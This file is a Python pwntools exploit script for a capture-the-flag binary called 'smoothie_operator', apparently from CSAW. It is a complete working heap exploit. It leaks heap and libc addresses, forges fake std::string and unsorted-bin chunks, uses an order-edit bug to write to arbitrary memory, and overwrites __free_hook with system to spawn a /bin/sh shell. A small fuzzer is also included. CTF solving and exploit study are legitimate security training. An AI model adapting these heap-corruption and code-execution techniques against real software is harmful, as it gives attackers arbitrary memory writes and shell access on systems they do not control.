from pwn import *


context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
context.aslr = True

order_id_counter = 1
complain_counter = 1
def place_order():
    global order_id_counter
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("#")
    # order_id = random.randrange(1, 100)
    order_id = order_id_counter
    order_id_counter += 1
    p.sendline(str(order_id))
    for i in range(7):
        p.recvuntil("Would you like any")
        p.sendline("y")
        p.recvuntil("How many")
        p.sendline(str(5))

    return order_id

def place_smoothie():
    global order_id_counter
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("#")
    # order_id = random.randrange(1, 100)
    order_id = order_id_counter
    order_id_counter += 1
    p.sendline(str(order_id))
    # p.sendline(str("Q"*0x40))
    # p.sendline(str("Q"*0x40))
    # p.sendline(str("Q"*0x40))
    # p.sendline(str("Q"*0x40))
    p.sendline("0")

    p.recvuntil("Large")
    p.sendline("1")
    p.recvuntil("Protein")
    p.sendline("1")
    p.recvuntil("avocado")
    p.sendline(str(0x13371337))

    return order_id

off = 0xff * 4
print(f"off {hex(off)}")
def edit_order(order, payload):
    p.recvuntil(b">")
    p.sendline(b"3")
    p.recvuntil(b">")
    p.sendline(str(order).encode())
    try:
        x = p.recvuntil(b"Editing", timeout=5.0)
    except Exception:
        return
    if len(x) == 0:
        return
    p.recvuntil(b"$")
    p.sendline(b"1.00")

    # p.recvuntil("Enter up to")
    # p.sendline("0")
    # p.recvuntil("Large")
    # p.sendline("1")
    # p.recvuntil("Protein")
    # p.sendline("1")
    # p.recvuntil("avocado")
    # p.sendline(str(0x13371337))

    p.recvuntil(b"Choose an flavor to edit")
    p.sendline(b"0")
    p.recvuntil(b"new quantity")
    p.sendline(str(payload).encode())
    # p.sendline(str(0x40000))

def prep(order):
    p.recvuntil(b">")
    p.sendline(b"4")
    p.recvuntil(b"order number")
    p.sendline(str(order).encode())
    # try:
    #     p.recvuntil("ERROR", timeout=0.1):
    # except:
    #     print

def serve(order):
    p.recvuntil(b">")
    p.sendline(b"5")
    p.recvuntil(b"order number")
    p.sendline(str(order).encode())

def cancel(order):
    p.recvuntil(b">")
    p.sendline(b"6")
    p.recvuntil(b"order number")
    p.sendline(str(order).encode())

def complain():
    global complain_counter
    complain_counter += 1
    p.recvuntil(b">")
    p.sendline(b"8")
    p.recvuntil(b"Please enter your complaint")
    p.sendline(b"COMPLAINT" * 0x100)
    cid = complain_counter
    complain_counter += 1
    return cid

def complain_bytes(by):
    global complain_counter
    p.recvuntil(">")
    p.sendline("8")
    p.recvuntil("Please enter your complaint")
    p.sendline(by)
    cid = complain_counter
    complain_counter += 1
    return cid

def resolve_complaint(complaint):
    p.recvuntil(b">")
    p.sendline(b"9")
    p.recvuntil(b"Please enter complaint number")
    p.sendline(str(complaint).encode())

def edit_complaint(complaint, cbytes):
    p.recvuntil(b">")
    p.sendline(b"10")
    p.recvuntil(b"Please enter complaint number")
    p.sendline(str(complaint).encode())
    p.recvuntil(b"updated complaint")
    p.sendline(cbytes)

def leak_order():
    global order_id_counter
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("#")
    # order_id = random.randrange(1, 10)
    order_id = order_id_counter
    order_id_counter += 1
    p.sendline(str(order_id))
    for i in range(7):
        p.recvuntil("Would you like any")
        p.sendline("n")

    return order_id

def order_pastry():
    global order_id_counter
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("#")
    # order_id = random.randrange(1, 10)
    order_id = order_id_counter
    order_id_counter += 1
    p.sendline(str(order_id))

    p.recvuntil("Would you like any")
    p.sendline("y")
    p.recvuntil("How many")
    p.sendline("7")
    for i in range(9):
        p.recvuntil("Would you like any")
        p.sendline("n")

    return order_id

def print_queue():
    p.recvuntil("Print queue")
    p.sendline("1")
    leak = p.recvuntil("-------------------------")
    return leak



def pwn(p):
    order_chunk = 0x55555559caa0
    order_chunk_size = 0x50

    p_order = order_pastry()
    cancel(p_order)


    known_leak = 0x55555559cab8
    l = leak_order()
    leak = print_queue()
    print(leak.decode())
    leak1 = leak[leak.index(b'White: '):]
    leak2 = leak[leak.index(b'Blue: '):]
    leak1 = leak1.split(b"\n")[0].split(b": ")[1].decode()
    leak2 = leak2.split(b"\n")[0].split(b": ")[1].decode()
    leak1, leak2 = int(leak1, 10), int(leak2, 10)
    heap_leak = leak2 << 32 | leak1
    print(hex(heap_leak))
    # p.interactive()

    # Allocate until the vector gets reallocated
    for _ in range(0x138// 8):
        complain_bytes(b"D" * 0x50)
        # place_order()

    o = place_order()
    place_order()
    place_order()
    complain_bytes(b"Z" * 0x50)
    complain_bytes(b"Z" * 0x50)
    # Index 0x6f is where we have our arbitrary write
    print(f"Next index: {hex(complain_counter-2)} {hex(o)}")
    for _ in range(complain_counter-1, 0x3f):
        complain_bytes(b"J" * 0x50)

    victim_str = complain_bytes("K" * 0x50)


    complain_chunk = (heap_leak - known_leak) + 0x55555559fa50
    complain_chunk_body = b"X" * 0x18

    # For the first complaint, the string will point to
    # a fake unsorted-bin chunk at (complain_chunk+0x40)
    string1 = p64(complain_chunk + 0x40) + p64(0x1337) + p64(0x3771)

    # The fake unsorted bin chunk
    fake_unsorted_bin_chunk = p64(0x1001) + b"\x99" * 0xff8

    # (complain_chunk + 0x18)
    complain_chunk_body += p64(0x221) + string1

    # (complain_chunk + 0x38), userdata for this chunk is at (complain_chunk + 0x40)
    complain_chunk_body += fake_unsorted_bin_chunk + p64(0x101) + b"\x88" * 0xf8 + p64(0x101)

    # For the second complaint, the string will point to
    # THE SAME fake unsorted-bin chunk at (complain_chunk+0x40)

    # We need a second fake std::string pointing to the same place
    # so that we can read from the free'd chunk to get the leak
    string_chunk_off = len(complain_chunk_body)
    complain_chunk_body += p64(complain_chunk+0x40) + p64(0x40) + p64(0x0)
    complain_bytes(complain_chunk_body.ljust(0x1f000, b"\x00"))

    # Write the address of the first fake std::string into the array
    edit_order(o, (complain_chunk+0x20) & 0xffffffff)

    # Free the std::string, and it's backing 'unsorted bin chunk'
    resolve_complaint(victim_str)

    # Write the address of the second fake std::string into the array
    edit_order(o, (complain_chunk+string_chunk_off) & 0xffffffff)

    # Now read out the leak! (It is complaint number 64)
    p.sendline("7")
    p.recvuntil(b"64: ")
    libc_leak = p.recvline()
    libc_leak = u64(libc_leak[:8])
    print(hex(libc_leak))
    # p.interactive()

    # Compute system/free_hook addresses
    system_addr = (0xffffffffffe656b0 + libc_leak) & 0xffffffffffffffff
    free_hook_addr = (0xffffffffffe656b0 + libc_leak + 0x19cbb8) & 0xffffffffffffffff

    p.recvuntil(b"Please choose")

    # Construct a fake string, inside another complaint
    new_complain_body = p64(free_hook_addr-0x8) + p64(0x40) + p64(0x40) + p64(0) + b"F" * 0x50
    complain_bytes(new_complain_body)

    # Compute the address of this new complaint containing a fake std::string
    new_complain_addr = (heap_leak - known_leak) + 0x55555559fac0

    # Arbitrary write
    edit_order(o, (new_complain_addr) & 0xffffffff)
    edit_complaint(64, p64(0xbbbbbbbbbbbbbbbb) + p64(system_addr))

    # Get /bin/sh free'd
    p.recvuntil("Please choose")
    p.sendline("8")
    p.recvuntil("complaint")
    p.sendline("////////////////bin/sh\x00'")
    p.interactive()


    # Minimal PoC Crash
    # o = place_order()
    # print(str(o))
    # complain()
    # edit_order(o)


def fuzz(p):
    orders = []
    complaint_count = 0
    try:
        while True:
            choice = random.randrange(8 if len(orders) > 0 else 1)
            if choice != 0:
                order = random.choice(orders)
                # print(str(order))
            if choice == 0 or choice >= 8:
                orders.append(place_order())
                print(f"place {orders[-1]}")
            elif choice == 1:
                prep(order)
                print(f"prep {order}")
            elif choice == 2:
                serve(order)
                print(f"serve {order}")
            elif choice == 3:
                cancel(order)
                print(f"cancel {order}")
                orders.remove(order)
            # elif choice == 4:
            #     complain()
            #     complaint_count += 1
            #     print(f"complain {complaint_count}")
            # elif choice == 5 and complaint_count > 0:
            #     resolve_complaint(random.randrange(complaint_count)+1)
            #     print(f"resolve {complaint_count+1}")
            #     complaint_count -= 1
            # elif choice == 6 and complaint_count > 0:
            #     edit_complaint(random.randrange(complaint_count)+1, b"Z" * 0x2000)
            #     print(f"editcomplaint {complaint_count+1}")
            elif choice == 7:
                edit_order(order, 0xeeeeeeee)
                print(f"editorder {order}")

    except Exception as e:
        print(e)
        p.interactive()
    p.close()

p = process("./smoothie_operator", env={})
# p = remote("pwn.chal.csaw.io", 5024)

# gdb.attach(p, gdbscript="""
# # b edit_order
# b system
# c
# """)
pwn(p)
# fuzz(p)
